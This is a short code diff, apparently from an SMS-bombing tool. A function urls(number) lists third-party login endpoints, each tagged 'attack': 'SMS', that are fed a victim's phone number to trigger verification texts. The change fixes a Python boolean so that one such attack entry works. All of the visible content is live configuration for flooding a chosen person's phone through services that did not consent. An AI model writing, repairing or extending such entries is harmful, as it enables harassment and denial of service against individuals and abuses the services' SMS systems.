@@ -7368,7 +7368,7 @@ def urls(number):
             'method': 'post',
             'url': 'https://api.ennergiia.com/auth/api/development/lor',
             'headers': {"Content-Type": "application/json"},
-            'json': {"referrer":"ennergiia","via_sms":true,"phone": f"+{number}"},
+            'json': {"referrer":"ennergiia","via_sms": True,"phone": f"+{number}"},
         },
         {
             'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Fundayshop', 'anonymous': 'No'},
